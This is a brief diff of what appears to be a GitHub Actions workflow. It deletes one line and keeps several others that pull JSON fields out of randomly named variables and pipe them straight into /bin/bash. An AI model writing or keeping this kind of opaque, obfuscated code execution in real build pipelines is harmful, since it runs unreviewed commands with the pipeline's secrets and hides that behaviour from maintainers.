@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$tf660" | jq -r .egw9 | /bin/bash
           echo $r3899 | jq -r .ad61 | /bin/bash
           echo $wjmk62 | jq -r .qjw1145 | /bin/bash
-          echo $ue21722 | jq -r .sb8 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
